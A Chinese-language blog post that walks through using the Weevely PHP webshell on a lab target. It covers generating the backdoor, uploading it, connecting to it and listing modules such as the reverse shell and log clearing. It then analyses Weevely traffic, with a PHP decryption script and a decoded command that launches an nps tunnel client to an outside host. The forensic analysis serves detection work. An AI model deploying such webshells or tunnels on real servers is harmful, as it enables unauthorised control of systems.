---
title: Weevely 使用与流量分析
published: 2024-11-01 21:45
tags: [安全, Webshell, Weevely, 流量分析]
category: 网安
draft: false
---

# Weevely 使用与流量分析

## 一、weevely生成、上传、连接、执行

### weevely前言

```
Webshell是经常被使用的攻击手法，一般会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或php后门，得到一个命令执行环境，以达到控制网站服务器的目的
```

### 简介

```
（在Linux中已经集成安装了）

weevely是一款使用python编写针对PHP的webshell工具，采用c/s模式构建，能模拟一个类似于telnet的连接shell。

使用的是比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，有很好的隐蔽性。

weevely具有生成shell文件、连接后台、资源搜索、信息探测、文件管理操作、错误配置审计、暴力破解、数据库操作、端口扫描等功能
```

### 第一步：查看是否安装weevely，并查看版本信息

```
打开终端，输入weevely，检查是否安装了weevely，如果安装过，就能看见版本信息，并能看见基本的使用说明
```

![](/images/posts/weevely/5.jpg)

### 第二步：生成shell（php）文件

```
weevely generate <password>  <path>/xx.php

我这里输入的是weevely generate 111 /root/1.php 

(这个path是已经存在的路径，而后面的文件是将要在这个目录下生成的shell文件)
```

![](/images/posts/weevely/6.jpg)

![](/images/posts/weevely/7.jpg)

### 第三步：上传文件到目标服务器 

```
我这里使用owaspbwa靶机来试
```

![](/images/posts/weevely/8.jpg)

找到upload上传地方，然后上传生成的shell（php）文件

![](/images/posts/weevely/9.jpg)

查看上传文件所在的地址（真实中，文件目录啥的都可以扫出来）

![](/images/posts/weevely/10.jpg)

### 第四步：在终端使用weevely，连接到shell（php文件）

```
weevely  <url>  <password>

我这里输入的是weevely http://192.168.190.130/dvwa/hackable/uploads/1.php 111

这里的URL指文件上传后的文件所在地址
```

![](/images/posts/weevely/11.jpg)

### 第五步：执行相关系统命令，获取相关信息

```
第一次执行的提示Permission denied（权限不够）

然后下面就进入到上传到的那个文件夹里面了
```

![](/images/posts/weevely/12.jpg)

然后再加上ls

就成功了 

![](/images/posts/weevely/13.jpg)

### 第六步：调用weevely模块

```
执行更多的操作，输入help命令可以查看相关的命令
```

![](/images/posts/weevely/14.jpg)

随机试一个幸运儿

![](/images/posts/weevely/15.jpg)

### 小白初试使用方法：

```
不知道模块的命令的话，就可以把命令输入，然后查看给出的提示
```

![](/images/posts/weevely/16.jpg)

### 模块大全：

```
:backdoor_reversetcp          执行反向TCP shell

:backdoor_tcp                 在TCP端口产生一个壳

:file_cp                      复制单个文件

 :file_grep                    打印线与多个文件中的模式匹配

 :file_zip                     压缩或展开ZIP文件

 :file_bzip2                   压缩或展开Bzip2文件

:file_tar                     压缩或展开tar文件

 :file_gzip                    压缩或展开Gzip文件

:file_mount                   使用httpfs安装远程文件系统

 :file_cd                      更改当前工作目录

 :file_clearlog                从文件中删除字符串

 :file_read                    从远程文件系统中读取远程文件

:file_download                从远程文件系统下载文件

 :file_touch                   更改文件时间戳

 :file_ls                      列表目录内容

 :file_enum                    检查存在列表列表的存在和权限

:file_upload                  将文件上传到远程文件系统

 :file_find                    查找具有给定名称和属性的文件

 :file_check                   获取文件的属性和权限

 :file_edit                    在本地编辑器上编辑远程文件

 :file_webdownload             下载URL.

 :file_upload2web              将文件自动上传到Web文件夹并获得相应的URL

:file_rm                      删除远程文件

 :shell_php                    执行php命令

 :shell_sh                     执行shell命令

:shell_su                     执行su的命令

:sql_dump                     多DBMS MySqldump更换

:sql_console                  执行SQL查询或运行控制台

 :bruteforce_sql               BruteForce SQL数据库

:net_ifconfig                 获取网络接口地址

:net_mail                     发送邮件

 :net_curl                     执行类似卷曲的HTTP请求。

 :net_scan                     TCP端口扫描。

 :net_proxy                    运行本地代理以通过目标浏览HTTP / HTTPS浏览。

 :net_phpproxy                 在目标上安装PHP代理。

:system_info                  收集系统信息。

 :system_extensions            收集PHP和WebServer扩展列表。

 :system_procs                 列出运行进程。

:audit_phpconf               审核PHP配置。

 :audit_suidsgid               查找suid或sgid标志的文件。

 :audit_disablefunctionbypass  旁路禁用与mod_cgi和.htaccess的限制。

 :audit_filesystem             审核文件系统以获取弱权限。        

 :audit_etcpasswd              用不同的技术读取 / etc / passwd。
```

---

## 二、Weevely流量分析

### 文件生成

```bash
# weevely generate <password> <filename> 

┌──(root㉿kali)-[/home/dcj/Desktop]
└─# weevely generate 123456 1.php             
Generated '1.php' with password '123456' of 692 byte size.
```

![](/images/posts/weevely/3.jpg)

### 解密分析

![](/images/posts/weevely/1.jpg)

```assembly
根据上几节分析可确定Weevely工具特征：
请求body字段为：随机16个字节+12个字节秘钥+echo(X);的加密字符串+12个字节秘钥+16个随机字节。
响应body字段为：随机16个字节+12个字节秘钥（与请求中相同）+请求中X加密字符串+12个字节秘钥（与请求中相同）。

# 解密为中间Qf开头的内容！！！
```

```
webshell为加密的文件
```

![](/images/posts/weevely/2.jpg)

```bash
# phar进行解密
┌──(root㉿kali)-[/home/dcj/Desktop]
└─# phar extract -f 1.php
//home/dcj/Desktop/1.php/x ...ok
```

![](/images/posts/weevely/4.jpg)

```bash
# $k、$kh、$kf拼接为密码的md5
$k="e10adc39";$kh="49ba59abbe56";$kf="e057f20f883e"

# e10adc3949ba59abbe56e057f20f883e
```

```bash
┌──(root㉿kali)-[/home/dcj/Desktop]
└─# echo "e10adc3949ba59abbe56e057f20f883e:" > hash1.txt

┌──(root㉿kali)-[/home/dcj/Desktop]
└─# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)     
1g 0:00:00:00 DONE (2024-11-01 21:16) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

### 解密脚本

```php
<?php
$k = "9e7ace81";
$kh = "eb5d8c8e66d1";
$kf = "5edcaf439d42";
$p = "CyPJLZj1JqdKeIm5";

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";

    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}

//$m = "Qfl6qqJvunEp5dY28kBKxunL8ClrSiUKHbgTA3giT/BlfHBMoRL3EZuO+J5SWJsmgbek7a4N8X3qASu+eLY1hv/m3rjR4mCUIHcy23ETuemO0Hv3lfBi9lPY2anUSYsrIMNlS/arWCilWQthWJOZvG/NaWlNIZoLVCIgbxpLzDsOnvL9qmdyZB3ydTUgbicRFz/bw7wX/I+OkAWIXPr2Xs+rdlYQfl6qqJvunEp5dY28kBKxunL8ClrSiUKHbgTA3giT/BlfHBMoRL3EZuO+J5SWJsmgbek7a4N8X3qASu+eLY1hv/m3rjR4mCUIHcy23ETuemO0Hv3lfBi9lPY2anUSYsrIMNlS/arWCilWQthWJOZvG/NaWlNIZoLVCIgbxpLzDsOnvL9qmdyZB3ydTUgbicRFz/bw7wX/I+OkAWIXPr2Xs+rdlY";
//$m = "Qfl6qtJv+gEt4NY2SsSM+FmHH3fH7puy/Chzg44IK5lw3Io7Jp/WZykUDRGbWp5Wy2dgGvHcgWoLhg97pLL2xY4u0KBvCUEvRghENPctLNh1vXADfD+BrYbK4Vs0PO6iNkn8d3qjYhtsKVd4/7kGMUKTBkVKzy+zsuxfl8jes+qTdw2kpgMONovlZXz0wptZV2QJIf/RYBaGAbCiA74B40bbr793YXqS5edcaf439d42";
$m = "Qfl67CIO+gEhJcgrawfrcqrTubhK8GUN11XuLCcnxOstshOa8dNe00Y6QHjYW+bSPOnTz5fAe6exNJX5xSzQ4UZvj2RT8hzsh2eVpFDniykDtoUdBVvCMQQuu7TgRmQpni3RYCSlgkkQHMY9ksfamszD/apE97VmsRBENFE6WcY8mAcdpFDxc001MISr96yKXFTofyljnejHw/fkrX+Ksc1rfToh/s9b7RNIWTPbuF3uJ88hyuWd9sURk6wDsVdxdvlZqfyXPu/yE6GZ3BvDyTg6GTGo5edcaf439d42";

// 使用 @ 来抑制可能发生的警告或错误
$result = @gzuncompress(@x(@base64_decode($m), $k));

// 输出结果
echo $result;
?>
```

```bash
# try {chdir('/var/www/html/extend');@error_reporting(0);@system('nohup ./npc -server=192.168.18.37:8024 -vkey=fkca03riqemuuzy7 -type=tcp & 2>&1');}catch(Exception $e){echo "fQ8vhoERR".$e->getTrace()[0]["function"].": ".$e->getMessage()."fQ8vhoERR";}
```

```
得到了代理工具nps的vkey=fkca03riqemuuzy7
```
